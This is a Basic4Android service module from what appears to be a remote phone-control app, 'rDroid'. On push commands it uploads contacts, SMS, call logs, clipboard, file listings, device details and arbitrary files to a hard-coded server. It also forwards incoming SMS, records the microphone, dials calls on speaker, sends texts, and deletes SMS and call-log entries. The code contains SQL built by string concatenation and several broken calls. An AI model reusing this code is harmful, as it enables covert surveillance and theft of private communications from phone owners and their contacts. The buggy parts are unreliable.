Type=Service
Version=2.30
StartAtBoot=False
@EndOfDesignText@
'Service module
'Version 0.9
Sub Process_Globals
	Private hc As HttpClient
	Private hcInit As Boolean
	hcInit = False
	Private RegisterTask, UnregisterTask As Int
	RegisterTask = 1
	UnregisterTask = 2
	Private TW As TextWriter
	Dim Timerx As Timer
	Dim AR As AudioRecorder
	Dim MPp As MediaPlayer
	Dim SI As SmsInterceptor
	Dim PH As PhoneEvents
	Dim SQ As SQL
End Sub
Sub Service_Create
	MPp.Initialize
	SI.Initialize2("SI", 999)
	PH.Initialize("PH")
	'StartActivity(Main)
	CallSubDelayed(Main,"ReadSettings")
	SQ.Initialize(File.DirInternal, "list.db", True)
	SQ.ExecNonQuery("CREATE TABLE IF NOT EXISTS que(link TEXT)")
End Sub
Sub Service_Start (StartingIntent As Intent)
	Select StartingIntent.Action
		Case "com.google.android.c2dm.intent.REGISTRATION"
			HandleRegistrationResult(StartingIntent)
		Case "com.google.android.c2dm.intent.RECEIVE"
			MessageArrived(StartingIntent)
	End Select
	AR.Initialize
	StartServiceAt("smsReciever", DateTime.Now + 300000, True)	
End Sub

Sub Service_Destroy

End Sub
Sub MessageArrived (Intent As Intent)

	
	Dim From, CollapseKey, Data As String
	Dim p As Phone
	Dim su As StringUtils
	If Intent.HasExtra("from") Then From = Intent.GetExtra("from")
	If Intent.HasExtra("com") Then Data = Intent.GetExtra("com")
	If Intent.HasExtra("collapse_key") Then CollapseKey = Intent.GetExtra("collapse_key")

Notify(Data,True)
Log(Data)


If(Data.CompareTo("synccontacts")==0)Then
		Dim c As Contact
		Dim cs As Contacts2
  		Dim l As List
		Dim TW As TextWriter
		TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
		TW.Write("Date|N|" & DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|C|")
		l = cs.GetAll(True,False)
  		For i = 0 To l.Size - 1
    		c = l.Get(i)
    		Dim phs,ems As String
			Dim x As Int
			phs=""
			ems=""
			For x=0 To c.GetPhones.Size-1
			phs= phs & c.GetPhones.GetKeyAt(x) & "|P|" 
			Next
			For x=0 To c.GetEmails-1
			ems= ems & c.GetEmails.GetKeyAt(x) & "|E|" 
			Next
			
			'Log(phs)
			TW.Write(c.DisplayName & "|N|" & phs & "|N|" & ems & "|N|" & c.Id & "|N|" & c.LastTimeContacted  & "|N|" & c.Name & "|N|" & c.Notes & "|N|" & c.PhoneNumber & "|N|" & c.Starred & "|N|" & c.TimesContacted & "|C|")
			'Log(c.DisplayName & "|N|" & phs & "|C|")
  		Next
		TW.Flush
		TW.Close
		sndfile("synccontacts","data.txt")
Else If(Data.CompareTo("info")==0)Then
	Dim TW As TextWriter
	TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
	TW.Write(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|**DATA**|")
	Dim os As OperatingSystem
	TW.Write("Available External Memory : |S|" &  os.AvailableExternalMemorySize & "|**DATA**|")
	TW.Write("Available Internal Memory : |S|" &  os.AvailableInternalMemorySize & "|**DATA**|")
	TW.Write("Available Memory : |S|" &  os.AvailableMemory & "|**DATA**|")
	'TW.Write("Battery Level : |S|" &  os.BatteryLevel & "|**DATA**|")
	TW.Write("Build Board : |S|" &  os.Board & "|**DATA**|")
	TW.Write("Boot Loader : |S|" &  os.Bootloader & "|**DATA**|")
	TW.Write("Brand : |S|" &  os.Brand & "|**DATA**|")
	TW.Write("Codename : |S|" &  os.Codename & "|**DATA**|")
	TW.Write("CPU ABI : |S|" &  os.CPUABI & "|**DATA**|")
	TW.Write("CPU ABI2 : |S|" &  os.CPUABI2 & "|**DATA**|")
	TW.Write("Industrial Device Name : |S|" &  os.Device & "|**DATA**|")
	TW.Write("Display Build ID : |S|" &  os.Display & "|**DATA**|")
	TW.Write("Elasped CPU Time by this process : |S|" &  os.ElaspedCPUTime & "|**DATA**|")
	TW.Write("Available External Memory : |S|" &  os.externalMemoryAvailable & "|**DATA**|")
	TW.Write("Finger Print reader : |S|" &  os.Fingerprint & "|**DATA**|")
	TW.Write("Name of the hardware : |S|" &  os.Hardware & "|**DATA**|")
	TW.Write("Host : |S|" &  os.Host & "|**DATA**|")
	TW.Write("Change List ID : |S|" &  os.ID & "|**DATA**|")
	TW.Write("Manufacturer : |S|" &  os.Manufacturer & "|**DATA**|")
	TW.Write("Model : |S|" &  os.Model & "|**DATA**|")
	TW.Write("OS : |S|" &  os.os & "|**DATA**|")
	TW.Write("Product Name : |S|" &  os.Product & "|**DATA**|")
	TW.Write("Overall Product Name : |S|" &  os.Radio & "|**DATA**|")
	TW.Write("Release Version : |S|" &  os.Release & "|**DATA**|")
	TW.Write("SDK : |S|" &  os.SDK & "|**DATA**|")
	TW.Write("Serial : |S|" &  os.Serial & "|**DATA**|")
	TW.Write("Tags : |S|" &  os.Tags & "|**DATA**|")
	TW.Write("Threshold Memory : |S|" &  os.Threshold & "|**DATA**|")
	TW.Write("Time : |S|" &  os.Time & "|**DATA**|")
	TW.Write("Total External Memory Size : |S|" &  os.TotalExternalMemorySize & "|**DATA**|")
	TW.Write("Total Internal Memory Size : |S|" &  os.TotalInternalMemorySize & "|**DATA**|")
	TW.Write("OS Type : |S|" &  os.Type & "|**DATA**|")
	TW.Write("OS User : |S|" &  os.User & "|**DATA**|")
	TW.Write("Packet Data State : |S|" &  p.GetDataState & "|**DATA**|")
	TW.Write("Network Operator Name : |S|" &  p.GetNetworkOperatorName & "|**DATA**|")
	TW.Write("Network Type : |S|" &  p.GetNetworkType & "|**DATA**|")
	TW.Write("Phone Type : |S|" &  p.GetPhoneType & "|**DATA**|")
	TW.Write("Ringer Mode : |S|" &  p.GetRingerMode & "|**DATA**|")
	TW.Write("Airplane Mode : |S|" &  p.IsAirplaneModeOn & "|**DATA**|")
	TW.Write("Network Roaming : |S|" &  p.IsNetworkRoaming & "|**DATA**|")
	TW.Flush
	TW.Close

	sndfile("info","data.txt")
Else If(Data.CompareTo("getvolumes")==0)Then
	snd("getvolumes", "data=" & su.EncodeUrl("0=" & p.GetVolume(0) & ":1=" & p.GetVolume(1) & ":2=" & p.GetVolume(2) & ":3=" & p.GetVolume(3) & ":4=" & p.GetVolume(4) & ":5=" & p.GetVolume(5) & "|0=" & p.GetMaxVolume(0) & ":1=" & p.GetMaxVolume(1) & ":2=" & p.GetMaxVolume(2) & ":3=" & p.GetMaxVolume(3) & ":4=" & p.GetMaxVolume(4) & ":5=" & p.GetMaxVolume(5),"UTF8"))
Else If(Data.CompareTo("active")==0)Then
	snd("active","dt=" & su.EncodeUrl(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now), "UTF8"))
Else If(Data.CompareTo("getact")==0)Then
	snd("actget","")
Else If(Data.CompareTo("clrclpbrd")==0)Then
	Dim bc As BClipboard
	bc.clrText
Else If(Data.CompareTo("syncclpbrd")==0)Then
	Dim bc As BClipboard
	snd("syncclpbrd","data=" & su.EncodeUrl(bc.getText,"UTF8"))
Else If(Data.CompareTo("installedapps")==0)Then
	SyncInstalledApps
Else If(Data.CompareTo("listfiles")==0)Then
	TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
	TW.Write(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|**DATA**|")
	If(File.ExternalReadable==True) Then	ListFiles(File.DirRootExternal,"") Else TW.Write( "> Access Denied" )
	TW.Flush
	TW.Close
	sndfile("listfiles","data.txt")
Else If(Data.CompareTo("mpplay")==0)Then
	MPp.Play
Else If(Data.CompareTo("mpstop")==0)Then
	MPp.Stop
Else If(Data.CompareTo("mppause")==0)Then
	MPp.Pause
Else If(Data.CompareTo("mpget")==0)Then
	snd("mpget","duration=" &MPp.Duration & "&looping=" & MPp.Looping & "&position=" & MPp.Position)
Else If(Data.CompareTo("srstop")==0)Then
	'If(AR.isRecording==True)Then
	AR.stop
	Notify("Sound recording stopped.",True)
	'Else
	'Notify("No sound was being recorded.",True)
	'End If
Else If(Data.CompareTo("srstatus")==0)Then
	snd("srstatus","status=" & AR.isRecording)
	Notify("Sound recorder status synced.",True)
	Log(AR.isRecording)
Else If(Data.CompareTo("delallcontacts")==0)Then
		Dim m As miscUtil
		m.Initialize
Else
Dim splt() As String
splt=Regex.Split(":", Data)
If(splt.Length>0)Then
	If(splt(0).CompareTo("sms")==0)Then
		SyncSMS(splt(1),splt(2))
	Else If(splt(0).CompareTo("calllogs")==0)Then
		SyncCallLogs(splt(1))
	Else If(splt(0).CompareTo("vibrate")==0)Then
		Dim pv As PhoneVibrate
		pv.Vibrate(splt(1))
	Else If(splt(0).CompareTo("setvolume")==0)Then
	 	p.SetVolume(splt(1),splt(2),True)
	Else If(splt(0).CompareTo("unsetvolume")==0)Then
	 	p.SetVolume(splt(1),splt(2),False)
	Else If(splt(0).CompareTo("mute")==0)Then
	 	p.SetMute(splt(1),True)
	Else If(splt(0).CompareTo("unmute")==0)Then
	 	p.SetMute(splt(1),False)
	Else If(splt(0).CompareTo("ringermode")==0)Then
	 	p.SetRingerMode(splt(1))
	Else If(splt(0).CompareTo("screenbrightness")==0)Then
	 	WriteSetting("screen_brightness", splt(1))
	Else If(splt(0).CompareTo("screenbrightnessmode")==0)Then
	 	WriteSetting("screen_brightness_mode", splt(1))
	Else If(splt(0).CompareTo("dial")==0)Then
		Dim pc As PhoneCalls
		splt(1)=splt(1).Replace("#", "%23")
   	 	StartActivity(pc.Call(splt(1)))
		If(splt(2)>0)Then
		Timerx.Initialize("Timerx",splt(2))
		Timerx.Enabled=True
		End If
		Dim r As Reflector
		r.Target = r.GetContext
		r.Target = r.RunMethod2("getSystemService", "audio", "java.lang.String") 
		If(splt(3)>0)Then r.RunMethod2("setSpeakerphoneOn", True, "java.lang.boolean") Else r.RunMethod2("setSpeakerphoneOn2", False, "java.lang.boolean")
		If(splt(4)>=0)Then p.SetVolume(p.VOLUME_VOICE_CALL,splt(4),False)
	Else If(splt(0).CompareTo("uninstall")==0)Then
		Dim Inte As Intent
		Inte.Initialize("android.intent.action.DELETE", "package:" & splt(1))
		StartActivity(i)
	Else If(splt(0).CompareTo("runapp")==0)Then
		Dim Inte As Intent
		Dim pw As PackageManager
		Inte.Initialize("","")
		Inte=pw.GetApplicationIntent(splt(1))
		StartActivity(Inte)
	Else If(splt(0).CompareTo("killcall")==0)Then
		If(splt(1)>0)Then
		Timerx.Initialize("Timerx",splt(1))
		Timerx.Enabled=True
		Else
		KillCall
		End If
	Else If(splt(0).CompareTo("airplane")==0)Then
		If(splt(1).CompareTo("0")==0 AND splt(2)>0)Then
		SetAirplaneMode(True)
		Timerx.Initialize("TimerAirOff",splt(2))
		Timerx.Enabled=True
		Else If(splt(1).CompareTo("1")==0 AND splt(2)>0)Then
		Timerx.Initialize("TimerAirOn",splt(2))
		Timerx.Enabled=True
		End If
	Else If(splt(0).CompareTo("mpset")==0)Then
		If(splt(1)>0)Then	MPp.Looping=True Else MPp.Looping=False
		MPp.SetVolume(splt(2),splt(3))
	Else If(splt(0).CompareTo("srstart")==0)Then
		If File.Exists(File.DirRootExternal, "/rDroid/Recordings")==False Then File.MakeDir(File.DirRootExternal, "/rDroid/Recordings")
		AR.AudioSource = AR.AS_MIC
		AR.OutputFormat = AR.OF_THREE_GPP
		AR.AudioEncoder = AR.AE_AMR_NB
		DateTime.DateFormat = "yyMMddHHmmss"
		AR.setOutputFile(File.DirRootExternal,"/rDroid/Recordings/"& DateTime.date(DateTime.now) & ".wav")
		If(splt(2)>0) Then AR.MaxDuration=splt(2)
		If(splt(3)>0) Then AR.MaxFileSize=splt(3)
		AR.prepare
		AR.start
		Notify("Sound recording started.",True)
	Else If(splt(0).CompareTo("beep")==0)Then
		Dim b As Beeper
		b.Initialize(splt(1),splt(2))
		b.Beep
	Else If(splt(0).CompareTo("beep2")==0)Then
		Dim b As Beeper
		b.Initialize2(splt(1),splt(2),splt(3))
		b.Beep
		Dim m As miscUtil
	Else If(splt(0).CompareTo("delcontact")==0)Then
		Dim m As miscUtil
		m.Initialize
		m.GetContactByID(splt(1))
	Else If(splt(0).CompareTo("rcalllogs")==0)Then
		RemoveCallLogs(splt(1),splt(2))
	Else If(splt(0).CompareTo("toogle")==0)Then
		Toogle(splt(1),splt(2))
	End If
End If
End If

End Sub

Sub JobDone (Job As HttpJob)
   ' Log("JobName = " & Job.JobName & ", Success = " & Job.Success )
If(Job.Success==True  )Then
	Log(Job.GetString)
	Dim splt() As String
	splt=Regex.Split("==>", Job.GetString)
	splt=Regex.Split("<==",splt(1))
	Dim res As String
	res=splt(0)
	If(Job.JobName.CompareTo("active")==0)Then
		Notify("I told to server that i am active",True)
	Else If(Job.JobName.CompareTo("actget")==0)Then
		'Notify("Sending...",True)
		splt=Regex.Split("\|MAD\|", res)
		Dim i As Int
		Dim mes As String
	
		For i=0 To splt.Length-1
			If(splt(i).StartsWith("mes")==True)Then
				Dim su As StringUtils
				mes=su.DecodeUrl(splt(i).SubString(3), "UTF8") 
				'Log(mes)
			Else If(splt(i).StartsWith("num")==True)Then
				If(splt(i).SubString(3).Length >1 AND mes.Length>0)Then
					SendTextMessage(splt(i).SubString(3),mes)
					Notify("Sending message to : "& splt(i).SubString(3),True)
					AddMessageToLogs(splt(i).SubString(3),mes)
					'Log("To: " & splt(i).SubString(3))
				End If
			Else If(splt(i).StartsWith("clpbrd")==True)Then
				Dim c As BClipboard
				c.setText(splt(i).SubString(6))
				Notify("Text copied to clipboard from server.",True)
			Else If(splt(i).StartsWith("install")==True)Then
				Dim inte As Intent 
				inte.Initialize(inte.ACTION_VIEW, "file://" & splt(i).SubString(7))
				inte.SetType("application/vnd.android.package-archive")
				StartActivity(i)
			Else If(splt(i).StartsWith("remsms")==True)Then
				Dim s As SmsMessages
				s.deletesms(splt(i).SubString(6))
				Notify("SMS deleted.",True)
			Else If(splt(i).StartsWith("mpdir")==True)Then
				MPp.Load(File.DirRootExternal & "/" & splt(i).SubString(5) , "/" & splt(i+1))
			Else If(splt(i).StartsWith("openurl")==True)Then
				Dim PI As PhoneIntents
				StartActivity(PI.OpenBrowser(splt(i).SubString(7)))
			Else If(splt(i).StartsWith("ccont")==True)Then
				Dim m As miscUtil
				Dim phones As Map, mails,m1,m2,m3 As Map
				Dim cont As Contact
				m1.Initialize
				m2.Initialize
				m3.Initialize
  phones.Initialize
  phones.Put(cont.PHONE_HOME, "1234567890")
  phones.Put(cont.PHONE_WORK, "0987654321")
  mails.Initialize
  mails.Put(cont.EMAIL_HOME, "mike@tester.com")
  mails.Put(cont.EMAIL_WORK, "mike@testeroffice.com")
				m.Initialize
				m.createContactEntry2("test",Null,phones,mails,splt(i+3),splt(i+4),"",Null,Null)
			Else If(splt(i).StartsWith("getfile")==0)Then
				sndfilesd("getfile",splt(i).SubString(7))
			End If
		Next
	
	'snd("actremove","")	
	Else If(Job.JobName.CompareTo("actremove")==0)Then
		Notify("Command removed from server.",True)
	Else If(Job.JobName.CompareTo("synccontacts")==0)Then
		Notify("Contacts synced.",True)
	Else If(Job.JobName.CompareTo("sms")==0)Then
		Notify("SMS Synced.",True)
	Else If(Job.JobName.CompareTo("calllogs")==0)Then
		Notify("Call logs synced.",True)
	Else If(Job.JobName.CompareTo("getvolumes")==0)Then
		Notify("Volumes values synced.",True)
	Else If(Job.JobName.CompareTo("syncclpbrd")==0)Then
		Notify("Clipboard synced.",True)
	Else If(Job.JobName.CompareTo("installedapps")==0)Then
		Notify("Installed applications list synced.",True)
	Else If(Job.JobName.CompareTo("getfile")==0)Then
		Notify("File uploaded to server.",True) 
	Else If(Job.JobName.CompareTo("listfiles")==0)Then
		Notify("Files list synced.",True)
	Else If(Job.JobName.StartsWith("msub")==0)Then
		If(res.CompareTo("1")==0)Then
			Notify("Message submitted to server !",False)
			SQ.ExecNonQuery("DELETE FROM que WHERE link='" & Job.JobName & "'")
		Else If(res.CompareTo("-1")==0)Then
			Notify("Incorrect username or password please re-login or re-register !",False)
		Else
			Notify("Unknown response from server !",False)
		End If
	Else
	Notify("Cannot connect to server !",False)
	End If
	Else	
		Notify("Unknown response from server !",False)
	End If
End If

	Job.Release
	
End Sub
Sub Timerx_Tick
    KillCall
    Timerx.Enabled=False
End Sub
Sub TimerAirOff_Tick
   	SetAirplaneMode(False)
    Timerx.Enabled=False
End Sub
Sub TimerAirOn_Tick
   	SetAirplaneMode(True)
    Timerx.Enabled=False
End Sub

Sub KillCall
    Dim r As Reflector
    r.Target = r.GetContext
    Dim TelephonyManager, TelephonyInterface As Object
    TelephonyManager = r.RunMethod2("getSystemService", "phone", "java.lang.String")
    r.Target = TelephonyManager
    TelephonyInterface = r.RunMethod("getITelephony")
    r.Target = TelephonyInterface
    r.RunMethod("endCall")
End Sub
Sub Toogle(OT As Int,Action As Int)
Dim TG As Toggle
TG.Initialize
If(Action=1)Then
	If OT=1 Then
	TG.TurnWiFiOn
	Else If OT=2 Then
	TG.TurnStreamVolumeOn
	Else If OT=3 Then
	TG.TurnRingerOn
	Else If OT=4 Then
	TG.TurnGPSOn
	Else If OT=5 Then
	TG.TurnDataConnectionOn
	Else If OT=6 Then
	TG.TurnBrightnessOn
	Else If OT=7 Then
	TG.TurnBluetoothOn
	Else If OT=8 Then
	TG.TurnAirplaneModeOn
	End If
Else If(Action=0)Then
	If OT=1 Then
	TG.TurnWiFiOff
	Else If OT=2 Then
	TG.TurnStreamVolumeOff
	Else If OT=3 Then
	TG.TurnRingerOff
	Else If OT=4 Then
	TG.TurnGPSOff
	Else If OT=5 Then
	TG.TurnDataConnectionOff
	Else If OT=6 Then
	TG.TurnBrightnessOff
	Else If OT=7 Then
	TG.TurnBluetoothOff
	Else If OT=8 Then
	TG.TurnAirplaneModeOff
	End If
Else If(Action=2)Then
	If OT=1 Then
	TG.ToggleWiFi
	Else If OT=4 Then
	TG.ToggleGPS
	Else If OT=5 Then
	TG.ToggleDataConnection
	Else If OT=7 Then
	TG.ToggleBluetooth
	Else If OT=8 Then
	TG.ToggleAirplaneMode
	Else If OT=9 Then
	TG.ToggleAudio
	End If
Else If(Action=3)Then
 	TG.Reboot
Else If(Action=4)Then
	TG.goToSleep(1000)
Else If(Action=5)Then
	snd("tooglestatus","1=" & TG.WiFi & "&3=" & TG.RingerMode & "&4=" & TG.GPS & "&5=" & TG.DataConnection & "&7=" & TG.Bluetooth & "&8=" & TG.AirplaneMode )
End If
End Sub
Sub ListFiles(Directory As String,Seperator As String)
Dim lst As List
Dim i As Int
lst=File.ListFiles(Directory)
If(lst.IsInitialized=True)Then
	For i=0 To lst.Size-1	
		If File.IsDirectory(Directory, lst.Get(i)) Then 
			ListFiles(Directory & "/" & lst.Get(i),Seperator & ">" )
			TW.Write( Seperator & ">" & lst.Get(i))
		Else
			TW.Write( Seperator & ">*" & lst.Get(i) & "*"  & File.LastModified(Directory,lst.Get(i)) & "*" & File.Size(Directory,lst.Get(i)) & "*"  )
		End If
	Next
Else
	TW.Write( Seperator & "> Access Denied" )
End If
End Sub


Sub SyncInstalledApps
    Dim i As Int
    Dim pm As PackageManager
	Dim TW As TextWriter
   
		
	TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
	TW.Write(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|**DATA**|")
		
    For i = 0 To pm.GetInstalledPackages.Size - 1
		Dim s As String
		s=pm.GetInstalledPackages.Get(i)
		TW.Write(pm.GetApplicationLabel(s) & "|S|" & pm.GetVersionCode(s) & "|S|" & pm.GetVersionName(s)  & "|S|" & pm.GetApplicationIntent(s)  & "|S|" &  s  & "|**DATA**|")
    Next
	TW.Flush
	TW.Close
	sndfile("installedapps","data.txt")
End Sub

Sub SendTextMessage(PhoneNumber As String, Message As String)As Boolean 
    Dim SmsManager As PhoneSms ,r As Reflector, parts As Object
    If PhoneNumber.Length>0 Then
        Try
            If Message.Length <= 160 Then 
                SmsManager.Send(PhoneNumber, Message)
            Else
                r.Target = r.RunStaticMethod("android.telephony.SmsManager", "getDefault", Null, Null)
                parts = r.RunMethod2("divideMessage", Message, "java.lang.String")
                r.RunMethod4("sendMultipartTextMessage", Array As Object(PhoneNumber, Null, parts, Null, Null), Array As String("java.lang.String", "java.lang.String", "java.util.ArrayList", "java.util.ArrayList", "java.util.ArrayList"))
            End If
            Return True
        Catch
        End Try
    End If
End Sub

Sub AddMessageToLogs(address As String,body As String)
    Dim r As Reflector
    r.Target = r.CreateObject("android.content.ContentValues")
    r.RunMethod3("put", "address", "java.lang.String", address, "java.lang.String")
    r.RunMethod3("put", "body", "java.lang.String", body, "java.lang.String")
    Dim contentValues As Object = r.Target
    r.Target = r.GetContext
    r.Target = r.RunMethod("getContentResolver")
    r.RunMethod4("insert", Array As Object( _
        r.RunStaticMethod("android.net.Uri", "parse", Array As Object("content://sms/sent"), _
            Array As String("java.lang.String")), _
        contentValues), Array As String("android.net.Uri", "android.content.ContentValues"))
End Sub

Sub SetWallPaper(Bmp As Bitmap)
    Dim r As Reflector
    r.Target = r.RunStaticMethod("android.app.WallpaperManager", "getInstance", _
        Array As Object(r.GetContext), Array As String("android.content.Context"))
    r.RunMethod4("setBitmap", Array As Object(Bmp), Array As String("android.graphics.Bitmap"))
End Sub

Sub SyncCallLogs(count As Int)
	Dim TW As TextWriter
		TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
		TW.Write(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|**DATA**|")
		Dim CL As CallLog
		For Each c As CallItem In CL.GetAll(count)
			TW.Write(c.CachedName &	"|S|" & c.CallType &"|S|" & c.Duration &"|S|" & c.Number &"|S|" &DateTime.Date(c.Date) & " " & DateTime.Time(c.Date)  & "|**DATA**|")
    	Next
		TW.Flush
		TW.Close
		sndfile("calllogs","data.txt")
End Sub
Sub SyncSMS(count As Int,stype As Int)
Dim TW As TextWriter
Dim i As Int
Dim SM1 As SmsMessages
Dim List1 As List

TW.Initialize(File.OpenOutput(File.DirInternal, "data.txt",False))
TW.Write(DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)& "|**SMS**|")
If(stype>=0)Then
	List1 = SM1.GetByType(stype)
Else
	List1 = SM1.GetAll
End If
For i = 0 To List1.Size - 1
	If(i<count)Then
		Dim Sms As Sms
		Sms = List1.Get(i)
		TW.Write(Sms.Body & "|**C**|" &  DateTime.Date(Sms.Date) & " " & DateTime.Time(Sms.Date) & "|**C**|" & Sms.Address & "|**C**|" & Sms.Type & "|**C**|" & Sms.Id  & "|**C**|" & Sms.PersonId  & "|**C**|" & Sms.Read & "|**SMS**|")
	End If
Next
TW.Flush
TW.Close
sndfile("sms","data.txt")
End Sub
Sub SetAirplaneMode(On As Boolean)
    Dim p As Phone
    If On = GetAirplaneMode Then Return 'already in the correct state
    Dim r As Reflector
    Dim contentResolver As Object
    r.Target = r.GetContext
    contentResolver = r.RunMethod("getContentResolver")
    Dim state As Int
    If On Then state = 1 Else state = 0
    r.RunStaticMethod("android.provider.Settings$System", "putInt", _
        Array As Object(contentResolver, "airplane_mode_on", state), _
        Array As String("android.content.ContentResolver", "java.lang.String", "java.lang.int"))
    Dim i As Intent
    i.Initialize("android.intent.action.AIRPLANE_MODE", "")
    i.PutExtra("state", "" & On)
    p.SendBroadcastIntent(i)
End Sub

Sub GetAirplaneMode As Boolean
    Dim p As Phone
    Return p.GetSettings("airplane_mode_on") = 1
End Sub
Sub RemoveCallLogs(Field As String,Value As String)
Dim r As Reflector
r.Target = r.GetContext
r.Target = r.RunMethod("getContentResolver")
Dim CONTENT_URI As Object = r.GetStaticField("android.provider.CallLog$Calls", "CONTENT_URI")
r.RunMethod4("delete", Array As Object(CONTENT_URI, Field & "=" & Value, Null),Array As String("android.net.Uri", "java.lang.String", "[Ljava.lang.String;"))
End Sub

Sub snd(jbname As String,par As String)
Dim j As HttpJob
Dim su As StringUtils
j.Initialize(jbname,Me)
j.Download("http://madsac.in/rdroid/api.php?act="& su.EncodeUrl(jbname, "UTF8") & "&usr="& su.EncodeUrl(Main.st.user, "UTF8") & "&pwd=" & su.EncodeUrl(Main.st.password, "UTF8") & "&name=" & su.EncodeUrl(Main.st.Name, "UTF8") & "&" & par )
End Sub
Sub sndfile(jbname As String,filename As String)
Dim j As HttpJob
Dim su As StringUtils
j.Initialize(jbname,Me)
j.PostFile("http://madsac.in/rdroid/api.php?act="& su.EncodeUrl(jbname, "UTF8") & "&usr="& su.EncodeUrl(Main.st.user, "UTF8") & "&pwd=" & su.EncodeUrl(Main.st.password, "UTF8") & "&name=" & su.EncodeUrl(Main.st.Name, "UTF8"),File.DirInternal, filename)
End Sub
Sub sndfilesd(jbname As String,filename As String)
Dim j As HttpJob
Dim su As StringUtils
j.Initialize(jbname,Me)
j.PostFile("http://madsac.in/rdroid/api.php?act="& su.EncodeUrl(jbname, "UTF8") & "&usr="& su.EncodeUrl(Main.st.user, "UTF8") & "&pwd=" & su.EncodeUrl(Main.st.password, "UTF8") & "&name=" & su.EncodeUrl(Main.st.Name, "UTF8") & "&filename=" &su.EncodeUrl(filename, "UTF8") ,File.DirRootExternal, filename)
End Sub
Sub WriteSetting(Setting As String, Value As Int)
    Dim r1 As Reflector
    Dim args(3) As Object
    Dim types(3) As String

    r1.Target = r1.GetContext
    
    args(0) = r1.RunMethod("getContentResolver")
    types(0) = "android.content.ContentResolver"
    args(1) = Setting
    types(1) = "java.lang.String"
    args(2) = Value
    types(2) = "java.lang.int"
    r1.RunStaticMethod("android.provider.Settings$System", "putInt", args, types) 
End Sub
Sub RegisterDevice (Unregister As Boolean)

	Dim i As Intent
	If Unregister Then		
		i.Initialize("com.google.android.c2dm.intent.UNREGISTER", "")
	Else
		i.Initialize("com.google.android.c2dm.intent.REGISTER", "")
		'sender id : google project id
		i.PutExtra("sender", "304137618362")
	End If
	Dim r As Reflector
	Dim i2 As Intent
	i2 = r.CreateObject("android.content.Intent")
	Dim pi As Object
	pi = r.RunStaticMethod("android.app.PendingIntent", "getBroadcast", _
		Array As Object(r.GetContext, 0, i2, 0), _
		Array As String("android.content.Context", "java.lang.int", "android.content.Intent", "java.lang.int"))
	i.PutExtra("app", pi)
	StartService(i)
End Sub


Sub HandleRegistrationResult(Intent As Intent)
	Dim p As Phone
	If Intent.HasExtra("error") Then
		Log("Error: " & Intent.GetExtra("error"))
		Notify("Error: " & Intent.GetExtra("error"), True)
	Else If Intent.HasExtra("unregistered") Then
	
		'unregister
		
	Else If Intent.HasExtra("registration_id") Then
		CallSubDelayed2(Main,"reg_code",Intent.GetExtra("registration_id"))
	End If
End Sub
Sub hc_ResponseSuccess (Response As HttpResponse, TaskId As Int)
	Select TaskId
		Case RegisterTask
			Notify("Registration completed successfully.", False)
		Case UnregisterTask
			Notify("Unregistration completed successfully.", False)
	End Select
	Response.Release
End Sub
Sub hc_ResponseError (Response As HttpResponse, Reason As String, StatusCode As Int, TaskId As Int)
	Dim errorMsg As String
	errorMsg = "Code=" & StatusCode & ", " & Reason
	If Response <> Null Then
		Try
			errorMsg = errorMsg & ", " & Response.GetString("UTF8")
		Catch
			Log("Failed to read error message.")
		End Try
		Response.Release
	End If
	Notify(errorMsg, True)
	Log(errorMsg)
End Sub
Sub Wait(Milliseconds As Int)
 Dim s As Long
 s = DateTime.Now
 Do While DateTime.Now < s + Milliseconds

 Loop
End Sub
Sub Notify(Text As String,LongDuration As Boolean)
ToastMessageShow(Text,LongDuration)
End Sub
Sub PH_SmsSentStatus (Success As Boolean, ErrorMessage As String, PhoneNumber As String, Intent As Intent)
	snd("smsstatus","success=" & Success & "&error=" & ErrorMessage & "&phone=" & PhoneNumber)
End Sub
Sub SI_MessageReceived (From As String, Body As String) As Boolean
Dim su As StringUtils
Dim dt As String
Dim p As Phone
Dim i As Int
dt=  DateTime.Date(DateTime.Now) & " " & DateTime.Time(DateTime.Now)


SQ.ExecNonQuery("INSERT INTO que VALUES('http://madsac.in/rdroid/api.php?act=addlog&ver=beta&usr=" & su.EncodeUrl(Main.st.user, "UTF8") & "&pwd=" & su.EncodeUrl(Main.st.password, "UTF8") & "&name=" & su.EncodeUrl(Main.st.Name, "UTF8")  &"&sms=" & su.EncodeUrl(Body, "UTF8") & "&from="& su.EncodeUrl(From, "UTF8") & "&dt=" & su.EncodeUrl(dt, "UTF8") & "')")

Dim c As Cursor
c=SQ.ExecQuery("SELECT * FROM que")
For i=0 To c.RowCount-1
c.Position=i
Dim j As HttpJob
Dim link As String
link=c.GetString("link")
j.Initialize(link,Me)
Log("PARAMS : " & link)
j.Download("msub" &link)
'Wait(2000)
Next


Return False



End Sub